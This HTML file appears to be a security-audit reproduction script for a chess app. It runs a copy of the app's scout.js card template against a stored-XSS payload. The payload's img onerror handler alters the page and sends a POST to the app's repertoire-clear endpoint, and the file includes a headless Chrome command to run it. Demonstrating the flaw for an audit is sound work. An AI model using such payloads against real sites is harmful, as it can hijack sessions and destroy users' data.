<!DOCTYPE html>
<!--
  ATK5-11 repro helper: runs the VERBATIM renderResults() template taken from
  frontend/scout.js:463-483 against the real payload returned by
  GET /api/scout/recent, to prove the sink executes attacker HTML.

  Run with:  chrome --headless --disable-gpu --no-sandbox --dump-dom \
                 --virtual-time-budget=4000 file://$PWD/audit/scripts/atk5_xss_dom.html
  Look for:  <title>XSS-EXECUTED</title>  and  data-pwned="1" on <html>
-->
<html>
<head><title>scout.js renderResults sink test</title></head>
<body>
<div id="scoutResultsGrid"></div>
<script>
// ---- the payload the app actually stores / returns (see atk5_xss_server.py) ----
const item = {
    id: "atk5xss1",
    source_type: "youtube",
    title: '<img src=x onerror="document.title=\'XSS-EXECUTED\';document.documentElement.setAttribute(\'data-pwned\',\'1\');fetch(\'/api/repertoire/clear\',{method:\'POST\'})">',
    channel: "Totally Legit Chess Channel",
    eco: "B20",
    thumbnail: "/assets/pieces/wN.svg",
    duration_formatted: "10:00"
};

// ---- VERBATIM copy of frontend/scout.js renderResults() card template -------
const filtered = [item];
const grid = document.getElementById('scoutResultsGrid');
grid.innerHTML = filtered.map(item => {
    const sourceBadge = item.source_type === 'youtube' ? '<span class="scout-badge-youtube">YouTube</span>' : '<span class="scout-badge-guide">Master Guide</span>';
    const thumb = item.thumbnail || '/assets/pieces/wN.svg';
    const ecoBadge = item.eco ? `<span class="badge-eco">${item.eco}</span>` : '';
    return `
        <div class="card-panel scout-card" data-source-id="${item.id}" data-source-type="${item.source_type}">
            <div class="scout-card-thumb-wrap">
                <img src="${thumb}" alt="${item.title}" class="scout-card-thumb" onerror="this.src='/assets/pieces/wN.svg'">
                <span class="scout-card-duration">${item.duration_formatted || ''}</span>
            </div>
            <div class="scout-card-body">
                <div class="scout-card-meta">
                    ${sourceBadge}
                    ${ecoBadge}
                </div>
                <div class="scout-card-title" title="${item.title}">${item.title}</div>
                <div class="scout-card-channel">${item.channel || 'Chess Guide'}</div>
            </div>
        </div>
    `;
}).join('');
</script>
</body>
</html>
